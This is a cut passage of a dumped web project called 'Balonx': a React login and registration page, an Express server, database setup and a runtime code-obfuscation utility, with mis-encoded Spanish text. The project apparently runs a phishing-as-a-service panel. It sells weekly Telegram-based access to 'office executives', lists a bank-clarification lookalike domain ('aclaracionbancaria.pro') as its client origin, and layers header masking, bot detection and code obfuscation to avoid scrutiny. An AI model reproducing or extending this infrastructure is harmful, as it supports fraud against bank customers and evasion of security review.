className=\"bg-[#2a2a2a] border-gray-700 text-white\"\n                      maxLength={50}\n                    />\n                  </div>\n                  \n                  <div className=\"space-y-2\">\n                    <Button \n                      onClick={generateQR} \n                      className=\"w-full bg-[#007bff] hover:bg-blue-700 text-white flex items-center justify-center\"\n                      disabled={isGenerating || !inputText}\n                    >\n                      {isGenerating ? (\n                        <>\n                          <RefreshCw className=\"h-4 w-4 mr-2 animate-spin\" />\n                          Generando...\n                        </>\n                      ) : (\n                        <>\n                          <QrCode className=\"h-4 w-4 mr-2\" />\n                          Generar QR\n                        </>\n                      )}\n                    </Button>\n                  </div>\n                  \n                  {qrImageUrl && (\n                    <div className=\"space-y-2\">\n                      <div className=\"flex space-x-2\">\n                        <Button\n                          onClick={downloadQR}\n                          className=\"flex-1 bg-[#28a745] hover:bg-green-700 text-white flex items-center justify-center\"\n                        >\n                          <Download className=\"h-4 w-4 mr-2\" />\n                          Descargar\n                        </Button>\n                        <Button\n                          onClick={copyQRText}\n                          className=\"flex-1 bg-[#6c757d] hover:bg-gray-700 text-white flex items-center justify-center\"\n                        >\n                          <Copy className=\"h-4 w-4 mr-2\" />\n                          Copiar\n                        </Button>\n                      </div>\n                    </div>\n                  )}\n                </div>\n                \n                <div className=\"col-span-2 flex flex-col items-center justify-center bg-[#2a2a2a] rounded-lg p-4 min-h-[300px]\">\n                  {qrImageUrl ? (\n                    <>\n                      <img \n                        src={qrImageUrl} \n                        alt=\"C贸digo QR generado\" \n                        className=\"max-w-full max-h-60 md:max-h-80\"\n                      />\n                      <div className=\"mt-4 text-center\">\n                        <span className=\"text-sm text-gray-400\">\n                          C贸digo: <span className=\"font-mono\">{inputText}</span>\n                        </span>\n                      </div>\n                    </>\n                  ) : (\n                    <div className=\"text-center text-gray-500 py-16\">\n                      <QrCode className=\"h-16 w-16 mx-auto mb-4 opacity-50\" />\n                      <p>Ingresa un c贸digo alfanum茅rico y presiona \"Generar QR\" para crear un c贸digo QR.</p>\n                    </div>\n                  )}\n                </div>\n              </div>\n            </div>\n          </CardContent>\n        </Card>\n      </div>\n    </div>\n  );\n}\n\nexport default QRGeneratorPage;","size_bytes":8083},"server/db.ts":{"content":"import { Pool, neonConfig } from '@neondatabase/serverless';\nimport { drizzle } from 'drizzle-orm/neon-serverless';\nimport ws from \"ws\";\nimport * as schema from \"@shared/schema\";\n\nneonConfig.webSocketConstructor = ws;\n\nif (!process.env.DATABASE_URL) {\n  throw new Error(\n    \"DATABASE_URL must be set. Did you forget to provision a database?\",\n  );\n}\n\nexport const pool = new Pool({ connectionString: process.env.DATABASE_URL });\nexport const db = drizzle({ client: pool, schema });\n","size_bytes":483},"client/src/pages/AuthPage.tsx":{"content":"import React, { useState, useEffect } from 'react';\nimport { useAuth } from '@/hooks/use-auth';\nimport { useToast } from '@/hooks/use-toast';\nimport { Button } from '@/components/ui/button';\nimport { Input } from '@/components/ui/input';\nimport { Label } from '@/components/ui/label';\nimport { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from '@/components/ui/card';\nimport { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';\nimport { Badge } from '@/components/ui/badge';\nimport { Alert, AlertDescription } from '@/components/ui/alert';\nimport { Shield, AlertTriangle, CheckCircle, MessageCircle, Info } from 'lucide-react';\nimport { useLocation } from 'wouter';\nimport { BotDetector } from '@/utils/botDetector';\nimport { HCaptcha, useHCaptcha } from '@/components/ReCaptcha';\nimport balonxLogo from '../assets/balonx_logo.png';\n\nexport default function AuthPage() {\n  const { loginMutation, registerMutation, user } = useAuth();\n  const { toast } = useToast();\n  const [, setLocation] = useLocation();\n  \n  const [loginData, setLoginData] = useState({\n    username: '',\n    password: ''\n  });\n  \n  const [registerData, setRegisterData] = useState({\n    username: '',\n    password: '',\n    confirmPassword: '',\n    telegramChatId: '',\n    hasDiscountCode: false,\n    discountCode: '',\n    accountType: 'individual' // 'individual' o 'office'\n  });\n  \n  const [executiveData, setExecutiveData] = useState({\n    username: '',\n    password: '',\n    otpCode: '',\n    requiresOtp: false\n  });\n  \n  const [botDetection, setBotDetection] = useState({\n    isBot: false,\n    confidence: 0,\n    reasons: [] as string[],\n    showDetection: false\n  });\n  \n  const [allowBotLogin, setAllowBotLogin] = useState(false);\n  const [activeTab, setActiveTab] = useState(\"login\");\n  const { token: captchaToken, isVerified: captchaVerified, handleVerify: handleCaptchaVerify } = useHCaptcha();\n  \n  // Inicializar detector de bots\n  useEffect(() => {\n    BotDetector.initialize();\n    \n    // Verificar detecci贸n de bots cada 3 segundos\n    const interval = setInterval(() => {\n      const detection = BotDetector.detectBot();\n      setBotDetection({\n        ...detection,\n        showDetection: detection.confidence > 30\n      });\n    }, 3000);\n    \n    return () => clearInterval(interval);\n  }, []);\n  \n  // Listener para cambiar a la pesta帽a de login despu茅s del registro\n  useEffect(() => {\n    const handleSwitchToLogin = () => {\n      setActiveTab(\"login\");\n    };\n    \n    window.addEventListener('switchToLogin', handleSwitchToLogin);\n    \n    return () => {\n      window.removeEventListener('switchToLogin', handleSwitchToLogin);\n    };\n  }, []);\n\n  // Usar useEffect para el redireccionamiento cuando el usuario ya est谩 autenticado\n  useEffect(() => {\n    if (user) {\n      console.log('Usuario ya autenticado, redirigiendo al panel de administraci贸n');\n      setLocation('/admin');\n    }\n  }, [user, setLocation]);\n\n  const handleLoginSubmit = async (e: React.FormEvent) => {\n    e.preventDefault();\n    \n    if (!loginData.username || !loginData.password) {\n      toast({\n        title: \"Error de validaci贸n\",\n        description: \"Por favor ingresa todos los campos requeridos\",\n        variant: \"destructive\"\n      });\n      return;\n    }\n    \n    if (!captchaVerified || !captchaToken) {\n      toast({\n        title: \"Verificaci贸n requerida\",\n        description: \"Por favor completa la verificaci贸n hCaptcha\",\n        variant: \"destructive\"\n      });\n      return;\n    }\n    \n    // Verificar detecci贸n de bots antes del login\n    const currentDetection = BotDetector.detectBot();\n    \n    if (currentDetection.isBot && !allowBotLogin) {\n      toast({\n        title: \"Acceso denegado\",\n        description: `Se detect贸 comportamiento automatizado (${currentDetection.confidence}% confianza). Usa la opci贸n de administrador para permitir bots.`,\n        variant: \"destructive\"\n      });\n      \n      // Mostrar detalles de la detecci贸n\n      setBotDetection({\n        ...currentDetection,\n        showDetection: true\n      });\n      \n      return;\n    }\n    \n    // Registrar intento de login\n    BotDetector.recordInteraction('login_attempt');\n    \n    // Agregar informaci贸n de detecci贸n y hCaptcha al login\n    const loginDataWithDetection = {\n      ...loginData,\n      botDetection: BotDetector.generateReport(),\n      hcaptchaToken: captchaToken\n    };\n    \n    loginMutation.mutate(loginDataWithDetection);\n  };\n\n  const handleExecutiveLogin = async (e: React.FormEvent) => {\n    e.preventDefault();\n    \n    try {\n      const response = await fetch(\"/api/executive/login\", {\n        method: \"POST\",\n        headers: { \"Content-Type\": \"application/json\" },\n        credentials: \"include\",\n        body: JSON.stringify({ \n          username: executiveData.username, \n          password: executiveData.password \n        }),\n      });\n\n      if (!response.ok) {\n        const error = await response.json();\n        throw new Error(error.message || \"Error en el login\");\n      }\n\n      const data = await response.json();\n\n      if (data.requiresOtp) {\n        setExecutiveData({ ...executiveData, requiresOtp: true });\n        toast({\n          title: \"OTP Enviado\",\n          description: \"Se ha enviado un c贸digo al Telegram de la oficina\",\n        });\n      }\n    } catch (error: any) {\n      toast({\n        title: \"Error de autenticaci贸n\",\n        description: error.message || \"Credenciales inv谩lidas\",\n        variant: \"destructive\",\n      });\n    }\n  };\n\n  const handleExecutiveOtpVerify = async (e: React.FormEvent) => {\n    e.preventDefault();\n    \n    try {\n      const response = await fetch(\"/api/executive/verify-otp\", {\n        method: \"POST\",\n        headers: { \"Content-Type\": \"application/json\" },\n        credentials: \"include\",\n        body: JSON.stringify({ otpCode: executiveData.otpCode }),\n      });\n\n      if (!response.ok) {\n        const error = await response.json();\n        throw new Error(error.message || \"Error en la verificaci贸n\");\n      }\n\n      const data = await response.json();\n\n      toast({\n        title: \"Acceso concedido\",\n        description: \"Acceso concedido exitosamente\",\n      });\n\n      // Ejecutivos van al mismo panel que el due帽o de la oficina\n      window.location.href = \"/admin\";\n    } catch (error: any) {\n      toast({\n        title: \"Error de verificaci贸n\",\n        description: error.message || \"C贸digo OTP inv谩lido\",\n        variant: \"destructive\",\n      });\n    }\n  };\n\n  const handleRegisterSubmit = async (e: React.FormEvent) => {\n    e.preventDefault();\n    \n    if (!registerData.username || !registerData.password || !registerData.telegramChatId) {\n      toast({\n        title: \"Error de validaci贸n\",\n        description: \"Por favor ingresa todos los campos requeridos, incluyendo tu Chat ID de Telegram\",\n        variant: \"destructive\"\n      });\n      return;\n    }\n    \n    if (registerData.password !== registerData.confirmPassword) {\n      toast({\n        title: \"Error de validaci贸n\",\n        description: \"Las contrase帽as no coinciden\",\n        variant: \"destructive\"\n      });\n      return;\n    }\n    \n    registerMutation.mutate({\n      username: registerData.username,\n      password: registerData.password,\n      telegramChatId: registerData.telegramChatId,\n      discountCode: registerData.hasDiscountCode ? registerData.discountCode : undefined,\n      accountType: registerData.accountType as 'individual' | 'office'\n    });\n  };\n\n  return (\n    <div className=\"flex min-h-screen bg-gray-100\">\n      {/* Logo */}\n      <div className=\"hidden md:flex flex-col justify-center items-center w-1/2 bg-gradient-to-br from-blue-600 to-blue-800 p-10 text-white\">\n        <div className=\"max-w-md text-center\">\n          <img \n            src={balonxLogo} \n            alt=\"Balonx Logo\" \n            className=\"w-64 h-64 mx-auto mb-8\"\n          />\n        </div>\n      </div>\n      {/* Formularios */}\n      <div className=\"w-full md:w-1/2 flex justify-center items-center p-5\">\n        <div className=\"w-full max-w-md\">\n          <Tabs value={activeTab} onValueChange={setActiveTab} className=\"w-full\">\n            <TabsList className=\"grid w-full grid-cols-3\">\n              <TabsTrigger value=\"login\">Iniciar Sesi贸n</TabsTrigger>\n              <TabsTrigger value=\"register\">Registrar</TabsTrigger>\n              <TabsTrigger value=\"executive\">Ejecutivo</TabsTrigger>\n            </TabsList>\n            \n            <TabsContent value=\"login\">\n              <Card>\n                <CardHeader>\n                  <CardTitle className=\"flex items-center gap-2\">\n                    <Shield className=\"h-5 w-5\" />\n                    Iniciar Sesi贸n\n                  </CardTitle>\n                  <CardDescription>\n                    Ingresa tus credenciales para acceder al panel de administraci贸n\n                  </CardDescription>\n                  \n                  <Alert className=\"mt-4 border-red-500 bg-red-50 dark:bg-red-950\">\n                    <AlertTriangle className=\"h-4 w-4 text-red-600\" />\n                    <AlertDescription className=\"text-red-800 dark:text-red-200\">\n                      <strong>锔 隆No se dejen estafar!</strong> La 煤nica venta oficial es por Telegram con <strong>@balonxsistema</strong>\n                    </AlertDescription>\n                  </Alert>\n                  \n                  {/* Indicador de detecci贸n de bots */}\n                  {botDetection.showDetection && (\n                    <Alert className={botDetection.isBot ? \"border-red-500\" : \"border-yellow-500\"}>\n                      <AlertTriangle className=\"h-4 w-4\" />\n                      <AlertDescription>\n                        <div className=\"flex items-center justify-between\">\n                          <span>\n                            {botDetection.isBot ? \"Bot detectado\" : \"Comportamiento sospechoso\"} \n                            ({botDetection.confidence}% confianza)\n                          </span>\n                          <Badge variant={botDetection.isBot ? \"destructive\" : \"secondary\"}>\n                            {botDetection.isBot ? \"BOT\" : \"SOSPECHOSO\"}\n                          </Badge>\n                        </div>\n                        {botDetection.reasons.length > 0 && (\n                          <ul className=\"mt-2 text-xs\">\n                            {botDetection.reasons.map((reason, index) => (\n                              <li key={index}> {reason}</li>\n                            ))}\n                          </ul>\n                        )}\n                      </AlertDescription>\n                    </Alert>\n                  )}\n                  \n                  {/* Opci贸n para permitir bots (solo para administradores) */}\n                  {botDetection.isBot && (\n                    <div className=\"flex items-center space-x-2 p-3 bg-yellow-50 rounded-lg\">\n                      <input\n                        type=\"checkbox\"\n                        id=\"allowBot\"\n                        checked={allowBotLogin}\n                        onChange={(e) => setAllowBotLogin(e.target.checked)}\n                        className=\"rounded\"\n                      />\n                      <Label htmlFor=\"allowBot\" className=\"text-sm\">\n                        Permitir acceso de bots (Solo administradores)\n                      </Label>\n                    </div>\n                  )}\n                </CardHeader>\n                <form onSubmit={handleLoginSubmit}>\n                  <CardContent className=\"space-y-4\">\n                    <div className=\"space-y-2\">\n                      <Label htmlFor=\"login-username\">Usuario</Label>\n                      <Input \n                        id=\"login-username\" \n                        type=\"text\" \n                        value={loginData.username} \n                        onChange={e => {\n                          setLoginData({...loginData, username: e.target.value});\n                          BotDetector.recordInteraction('username_input');\n                        }}\n                        onFocus={() => BotDetector.recordInteraction('username_focus')}\n                        placeholder=\"Nombre de usuario\"\n                      />\n                    </div>\n                    <div className=\"space-y-2\">\n                      <Label htmlFor=\"login-password\">Contrase帽a</Label>\n                      <Input \n                        id=\"login-password\" \n                        type=\"password\" \n                        value={loginData.password} \n                        onChange={e => {\n                          setLoginData({...loginData, password: e.target.value});\n                          BotDetector.recordInteraction('password_input');\n                        }}\n                        onFocus={() => BotDetector.recordInteraction('password_focus')}\n                        placeholder=\"Contrase帽a\"\n                      />\n                    </div>\n                    \n                    {/* Componente de hCaptcha */}\n                    <HCaptcha \n                      onVerify={handleCaptchaVerify}\n                      disabled={loginMutation.isPending}\n                    />\n                  </CardContent>\n                  <CardFooter className=\"flex flex-col space-y-2\">\n                    <Button \n                      type=\"submit\" \n                      className={`w-full ${\n                        (botDetection.isBot && !allowBotLogin) || !captchaVerified \n                          ? 'bg-red-600 hover:bg-red-700' \n                          : captchaVerified \n                          ? 'bg-green-600 hover:bg-green-700' \n                          : ''\n                      }`}\n                      disabled={\n                        loginMutation.isPending || \n                        (botDetection.isBot && !allowBotLogin) ||\n                        !captchaVerified\n                      }\n                      onClick={() => BotDetector.recordInteraction('login_button_click')}\n                    >\n                      {loginMutation.isPending ? \"Procesando...\" : \n                       botDetection.isBot && !allowBotLogin ? \"Bot Bloqueado\" :\n                       !captchaVerified ? \"Complete hCaptcha\" :\n                       \"Iniciar Sesi贸n\"}\n                    </Button>\n                    \n                    {/* Indicador de estado de detecci贸n y verificaci贸n */}\n                    <div className=\"flex flex-col items-center space-y-1 text-xs text-gray-500\">\n                      <div className=\"flex items-center space-x-2\">\n                        {botDetection.confidence < 30 ? (\n                          <>\n                            <CheckCircle className=\"h-3 w-3 text-green-500\" />\n                            <span>Comportamiento humano detectado</span>\n                          </>\n                        ) : (\n                          <>\n                            <AlertTriangle className=\"h-3 w-3 text-yellow-500\" />\n                            <span>Monitoreando comportamiento...</span>\n                          </>\n                        )}\n                      </div>\n                      <div className=\"flex items-center space-x-2\">\n                        {captchaVerified ? (\n                          <>\n                            <CheckCircle className=\"h-3 w-3 text-green-500\" />\n                            <span>hCaptcha verificado</span>\n                          </>\n                        ) : (\n                          <>\n                            <AlertTriangle className=\"h-3 w-3 text-orange-500\" />\n                            <span>Esperando verificaci贸n hCaptcha</span>\n                          </>\n                        )}\n                      </div>\n                    </div>\n                  </CardFooter>\n                </form>\n              </Card>\n            </TabsContent>\n            \n            <TabsContent value=\"register\">\n              <Card>\n                <CardHeader>\n                  <CardTitle>Registrar Usuario</CardTitle>\n                  <CardDescription>\n                    Crea una nueva cuenta para acceder al sistema\n                  </CardDescription>\n                  <Alert className=\"mt-4 border-red-500 bg-red-50 dark:bg-red-950\">\n                    <AlertTriangle className=\"h-4 w-4 text-red-600\" />\n                    <AlertDescription className=\"text-red-800 dark:text-red-200\">\n                      <strong>锔 隆No se dejen estafar!</strong> La 煤nica venta oficial es por Telegram con <strong>@balonxsistema</strong>\n                    </AlertDescription>\n                  </Alert>\n                </CardHeader>\n                <form onSubmit={handleRegisterSubmit}>\n                  <CardContent className=\"space-y-4\">\n                    {/* Tabs para tipo de cuenta */}\n                    <div className=\"space-y-3\">\n                      <Label className=\"text-base font-semibold\">Tipo de Cuenta</Label>\n                      <Tabs \n                        value={registerData.accountType} \n                        onValueChange={(value) => setRegisterData({...registerData, accountType: value})}\n                        className=\"w-full\"\n                      >\n                        <TabsList className=\"grid w-full grid-cols-2\">\n                          <TabsTrigger value=\"individual\" data-testid=\"tab-account-individual\">\n                            Usuario Individual\n                          </TabsTrigger>\n                          <TabsTrigger value=\"office\" data-testid=\"tab-account-office\">\n                            Oficina\n                          </TabsTrigger>\n                        </TabsList>\n                        \n                        <TabsContent value=\"individual\" className=\"mt-3\">\n                          <Alert className=\"border-blue-500\">\n                            <Info className=\"h-4 w-4 text-blue-600\" />\n                            <AlertDescription className=\"text-sm\">\n                              <strong>Cuenta Individual</strong><br/>\n                               M谩ximo 2 dispositivos<br/>\n                               Precio: <strong>3,000 MXN / semana</strong><br/>\n                               Ideal para uso personal\n                            </AlertDescription>\n                          </Alert>\n                        </TabsContent>\n                        \n                        <TabsContent value=\"office\" className=\"mt-3\">\n                          <Alert className=\"border-purple-500\">\n                            <Info className=\"h-4 w-4 text-purple-600\" />\n                            <AlertDescription className=\"text-sm\">\n                              <strong>Cuenta Oficina</strong><br/>\n                               Hasta 8 ejecutivos<br/>\n                               1 sesi贸n activa por ejecutivo<br/>\n                               OTP por Telegram para ejecutivos<br/>\n                               Precio: <strong>6,000 MXN / semana</strong><br/>\n                               Ideal para equipos\n                            </AlertDescription>\n                          </Alert>\n                        </TabsContent>\n                      </Tabs>\n                    </div>\n                    \n                    <div className=\"space-y-2\">\n                      <Label htmlFor=\"register-username\">Usuario</Label>\n                      <Input \n                        id=\"register-username\" \n                        type=\"text\" \n                        value={registerData.username} \n                        onChange={e => setRegisterData({...registerData, username: e.target.value})}\n                        placeholder=\"Nombre de usuario\"\n                        data-testid=\"input-register-username\"\n                      />\n                    </div>\n                    <div className=\"space-y-2\">\n                      <Label htmlFor=\"register-password\">Contrase帽a</Label>\n                      <Input \n                        id=\"register-password\" \n                        type=\"password\" \n                        value={registerData.password} \n                        onChange={e => setRegisterData({...registerData, password: e.target.value})}\n                        placeholder=\"Contrase帽a\"\n                      />\n                    </div>\n                    <div className=\"space-y-2\">\n                      <Label htmlFor=\"register-confirm-password\">Confirmar Contrase帽a</Label>\n                      <Input \n                        id=\"register-confirm-password\" \n                        type=\"password\" \n                        value={registerData.confirmPassword} \n                        onChange={e => setRegisterData({...registerData, confirmPassword: e.target.value})}\n                        placeholder=\"Confirmar contrase帽a\"\n                      />\n                    </div>\n                    <div className=\"space-y-2\">\n                      <Label htmlFor=\"register-telegram-chat-id\" className=\"flex items-center gap-2\">\n                        <MessageCircle className=\"h-4 w-4\" />\n                        Chat ID de Telegram\n                      </Label>\n                      <Input \n                        id=\"register-telegram-chat-id\" \n                        type=\"text\" \n                        value={registerData.telegramChatId} \n                        onChange={e => setRegisterData({...registerData, telegramChatId: e.target.value})}\n                        placeholder=\"Tu Chat ID de Telegram\"\n                      />\n                      <Alert>\n                        <Info className=\"h-4 w-4\" />\n                        <AlertDescription className=\"text-xs\">\n                          <strong>驴C贸mo obtener tu Chat ID?</strong><br/>\n                          <strong>Opci贸n 1 (Recomendada):</strong><br/>\n                          1. Busca nuestro bot en Telegram<br/>\n                          2. Env铆a el comando /start<br/>\n                          3. El bot te dar谩 tu Chat ID directamente<br/>\n                          <strong>Opci贸n 2:</strong><br/>\n                          1. Abre Telegram y busca el bot \"@userinfobot\"<br/>\n                          2. Env铆a /start y copia el n煤mero que te proporciona<br/>\n                          <br/>\n                          <strong>Nota:</strong> Necesitas este Chat ID para recibir c贸digos 2FA\n                        </AlertDescription>\n                      </Alert>\n                    </div>\n                    \n                    <div className=\"space-y-2\">\n                      <Label className=\"flex items-center gap-2\">\n                        驴Tienes un c贸digo de descuento?\n                      </Label>\n                      <div className=\"flex gap-4\">\n                        <button\n                          type=\"button\"\n                          onClick={() => setRegisterData({...registerData, hasDiscountCode: true})}\n                          className={`px-4 py-2 rounded-md transition-colors ${\n                            registerData.hasDiscountCode \n                              ? 'bg-blue-600 text-white' \n                              : 'bg-gray-200 text-gray-700 hover:bg-gray-300'\n                          }`}\n                        >\n                          S铆\n                        </button>\n                        <button\n                          type=\"button\"\n                          onClick={() => setRegisterData({...registerData, hasDiscountCode: false, discountCode: ''})}\n                          className={`px-4 py-2 rounded-md transition-colors ${\n                            !registerData.hasDiscountCode \n                              ? 'bg-blue-600 text-white' \n                              : 'bg-gray-200 text-gray-700 hover:bg-gray-300'\n                          }`}\n                        >\n                          No\n                        </button>\n                      </div>\n                    </div>\n                    \n                    {registerData.hasDiscountCode && (\n                      <div className=\"space-y-2\">\n                        <Label htmlFor=\"register-discount-code\">C贸digo de descuento</Label>\n                        <Input \n                          id=\"register-discount-code\" \n                          type=\"text\" \n                          value={registerData.discountCode} \n                          onChange={e => setRegisterData({...registerData, discountCode: e.target.value.toUpperCase()})}\n                          placeholder=\"Ingresa tu c贸digo\"\n                          className=\"uppercase\"\n                        />\n                      </div>\n                    )}\n                  </CardContent>\n                  <CardFooter>\n                    <Button \n                      type=\"submit\" \n                      className=\"w-full\" \n                      disabled={registerMutation.isPending}\n                    >\n                      {registerMutation.isPending ? \"Procesando...\" : \"Registrar\"}\n                    </Button>\n                  </CardFooter>\n                </form>\n              </Card>\n            </TabsContent>\n            \n            <TabsContent value=\"executive\">\n              <Card>\n                <CardHeader>\n                  <CardTitle className=\"flex items-center gap-2\">\n                    <Shield className=\"h-5 w-5\" />\n                    {executiveData.requiresOtp ? \"Verificaci贸n OTP\" : \"Acceso Ejecutivo\"}\n                  </CardTitle>\n                  <CardDescription>\n                    {executiveData.requiresOtp \n                      ? \"Ingresa el c贸digo OTP enviado al Telegram de la oficina\" \n                      : \"Ingresa tus credenciales de ejecutivo\"}\n                  </CardDescription>\n                </CardHeader>\n                \n                {!executiveData.requiresOtp ? (\n                  <form onSubmit={handleExecutiveLogin}>\n                    <CardContent className=\"space-y-4\">\n                      <div className=\"space-y-2\">\n                        <Label htmlFor=\"executive-username\">Usuario</Label>\n                        <Input \n                          id=\"executive-username\" \n                          data-testid=\"input-executive-username\"\n                          type=\"text\" \n                          value={executiveData.username} \n                          onChange={(e) => setExecutiveData({...executiveData, username: e.target.value})}\n                          placeholder=\"usuario_ejecutivo\"\n                          required\n                        />\n                      </div>\n                      <div className=\"space-y-2\">\n                        <Label htmlFor=\"executive-password\">Contrase帽a</Label>\n                        <Input \n                          id=\"executive-password\" \n                          data-testid=\"input-executive-password\"\n                          type=\"password\" \n                          value={executiveData.password} \n                          onChange={(e) => setExecutiveData({...executiveData, password: e.target.value})}\n                          placeholder=\"⑩⑩⑩⑩⑩⑩⑩\"\n                          required\n                        />\n                      </div>\n                    </CardContent>\n                    <CardFooter>\n                      <Button \n                        type=\"submit\" \n                        data-testid=\"button-executive-login\"\n                        className=\"w-full\"\n                      >\n                        Iniciar Sesi贸n\n                      </Button>\n                    </CardFooter>\n                  </form>\n                ) : (\n                  <form onSubmit={handleExecutiveOtpVerify}>\n                    <CardContent className=\"space-y-4\">\n                      <div className=\"space-y-2\">\n                        <Label htmlFor=\"executive-otp\">C贸digo OTP</Label>\n                        <Input \n                          id=\"executive-otp\" \n                          data-testid=\"input-executive-otp\"\n                          type=\"text\" \n                          value={executiveData.otpCode} \n                          onChange={(e) => setExecutiveData({...executiveData, otpCode: e.target.value})}\n                          placeholder=\"123456\"\n                          required\n                          maxLength={6}\n                          className=\"text-center text-2xl tracking-widest\"\n                        />\n                      </div>\n                      <Alert>\n                        <Info className=\"h-4 w-4\" />\n                        <AlertDescription className=\"text-sm\">\n                          El c贸digo OTP fue enviado al Telegram del due帽o de la oficina. Solic铆talo para continuar.\n                        </AlertDescription>\n                      </Alert>\n                    </CardContent>\n                    <CardFooter className=\"flex flex-col space-y-2\">\n                      <Button \n                        type=\"submit\" \n                        data-testid=\"button-verify-executive-otp\"\n                        className=\"w-full\"\n                      >\n                        Verificar OTP\n                      </Button>\n                      <Button \n                        type=\"button\" \n                        variant=\"ghost\" \n                        className=\"w-full\"\n                        onClick={() => setExecutiveData({...executiveData, requiresOtp: false, otpCode: ''})}\n                      >\n                        Volver\n                      </Button>\n                    </CardFooter>\n                  </form>\n                )}\n              </Card>\n            </TabsContent>\n          </Tabs>\n        </div>\n      </div>\n    </div>\n  );\n}","size_bytes":29801},"server/index.ts":{"content":"import express, { type Request, Response, NextFunction } from \"express\";\nimport { registerRoutes } from \"./routes\";\nimport { setupVite, serveStatic, log } from \"./vite\";\nimport cookieParser from \"cookie-parser\";\nimport dotenv from \"dotenv\";\nimport { obfuscateHeaders, serverMasking, botDetection, errorObfuscation, dynamicRateLimit } from \"./middleware/security\";\nimport \"./telegramBot\"; // Inicializar bot de Telegram\nimport \"./paymentBot\"; // Inicializar bot de pagos\nimport \"./bitsoService\"; // Inicializar servicio de Bitso\n\n// Cargar variables de entorno\ndotenv.config();\n\nconst app = express();\n\n// Aplicar middleware de seguridad y ofuscaci贸n\napp.use(obfuscateHeaders);\napp.use(serverMasking);\napp.use(botDetection);\napp.use(dynamicRateLimit);\n\napp.use(express.json());\napp.use(express.urlencoded({ extended: false }));\napp.use(cookieParser());\n\n// Configuraci贸n del entorno\nconst APP_TYPE = process.env.APP_TYPE || 'admin';\nconsole.log(`Ejecutando en modo: ${APP_TYPE}`);\n\n// Configurar CORS para permitir diferentes dominios\napp.use((req, res, next) => {\n  const allowedOrigins = [\n    process.env.ADMIN_DOMAIN || 'https://panel.aclaracionbancaria.pro',\n    process.env.CLIENT_DOMAIN || 'https://aclaracionbancaria.pro'\n  ];\n\n  const origin = req.headers.origin;\n  if (origin && allowedOrigins.includes(origin)) {\n    res.setHeader('Access-Control-Allow-Origin', origin);\n  }\n\n  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');\n  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');\n  res.setHeader('Access-Control-Allow-Credentials', 'true');\n\n  if (req.method === 'OPTIONS') {\n    return res.status(200).end();\n  }\n\n  const start = Date.now();\n  const path = req.path;\n  let capturedJsonResponse: Record<string, any> | undefined = undefined;\n\n  const originalResJson = res.json;\n  res.json = function (bodyJson, ...args) {\n    capturedJsonResponse = bodyJson;\n    return originalResJson.apply(res, [bodyJson, ...args]);\n  };\n\n  res.on(\"finish\", () => {\n    const duration = Date.now() - start;\n    if (path.startsWith(\"/api\")) {\n      let logLine = `${req.method} ${path} ${res.statusCode} in ${duration}ms`;\n      if (capturedJsonResponse) {\n        logLine += ` :: ${JSON.stringify(capturedJsonResponse)}`;\n      }\n\n      if (logLine.length > 80) {\n        logLine = logLine.slice(0, 79) + \"\";\n      }\n\n      log(logLine);\n    }\n  });\n\n  next();\n});\n\n(async () => {\n  const server = await registerRoutes(app);\n\n  // Manejo global de errores con ofuscaci贸n\n  app.use(errorObfuscation);\n\n  // importantly only setup vite in development and after\n  // setting up all the other routes so the catch-all route\n  // doesn't interfere with the other routes\n  if (app.get(\"env\") === \"development\") {\n    await setupVite(app, server);\n  } else {\n    serveStatic(app);\n  }\n\n  // ALWAYS serve the app on port 5000\n  // this serves both the API and the client.\n  // It is the only port that is not firewalled.\n  const port = 5000;\n  server.listen({\n    port,\n    host: \"0.0.0.0\",\n    reusePort: true,\n  }, () => {\n    log(`serving on port ${port}`);\n  });\n})();","size_bytes":3116},"client/src/utils/codeObfuscation.ts":{"content":"// Utilidades para ofuscar el c贸digo fuente din谩micamente\nexport class CodeObfuscator {\n  private static dynamicFunctions: Map<string, Function> = new Map();\n  \n  // Crear funciones ofuscadas din谩micamente\n  public static createObfuscatedFunction(code: string, functionName: string): Function {\n    // Ofuscar nombres de variables\n    const obfuscatedCode = this.obfuscateVariableNames(code);\n    \n    // Crear funci贸n usando eval (en contexto seguro)\n    try {\n      const obfuscatedFunction = new Function('return ' + obfuscatedCode)();\n      this.dynamicFunctions.set(functionName, obfuscatedFunction);\n      return obfuscatedFunction;\n    } catch (error) {\n      console.error('Error creating obfuscated function:', error);\n      return () => {};\n    }\n  }\n  \n  // Ofuscar nombres de variables en el c贸digo\n  private static obfuscateVariableNames(code: string): string {\n    const variableMap = new Map<string, string>();\n    let obfuscatedCode = code;\n    \n    // Buscar declaraciones de variables\n    const variableRegex = /\\b(var|let|const)\\s+([a-zA-Z_$][a-zA-Z0-9_$]*)/g;\n    let match;\n    \n    while ((match = variableRegex.exec(code)) !== null) {\n      const originalName = match[2];\n      if (!variableMap.has(originalName)) {\n        const obfuscatedName = this.generateObfuscatedName();\n        variableMap.set(originalName, obfuscatedName);\n      }\n    }\n    \n    // Reemplazar nombres de variables\n    for (const [original, obfuscated] of variableMap) {\n      const regex = new RegExp(`\\\\b${original}\\\\b`, 'g');\n      obfuscatedCode = obfuscatedCode.replace(regex, obfuscated);\n    }\n    \n    return obfuscatedCode;\n  }\n  \n  // Generar nombres ofuscados\n  private static generateObfuscatedName(): string {\n    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';\n    const length = Math.floor(Math.random() * 10) + 5;\n    let result = '';\n    \n    for (let i = 0; i < length; i++) {\n      result += chars.charAt(Math.floor(Math.random() * chars.length));\n    }\n    \n    return '_' + result;\n  }\n  \n  // Ofuscar strings en runtime\n  public static obfuscateString(str: string): string {\n    return Array.from(str)\n      .map(char => String.fromCharCode(char.charCodeAt(0) + Math.floor(Math.random() * 3) - 1))\n      .join('');\n  }\n  \n  // Crear proxy para ofuscar acceso a propiedades\n  public static createObfuscatedProxy<T extends object>(target: T): T {\n    return new Proxy(target, {\n      get(obj, prop) {\n        // Agregar delay aleatorio para acceso a propiedades\n        if (Math.random() < 0.1) {\n          setTimeout(() => {}, Math.random() * 10);\n        }\n        return obj[prop as keyof T];\n      },\n      set(obj, prop, value) {\n        // Agregar ruido a las asignaciones\n        if (Math.random() < 0.05) {\n          console.log(`Setting ${String(prop)} to obfuscated value`);\n        }\n        obj[prop as keyof T] = value;\n        return true;\n      }\n    });\n  }\n  \n  // M茅todo para 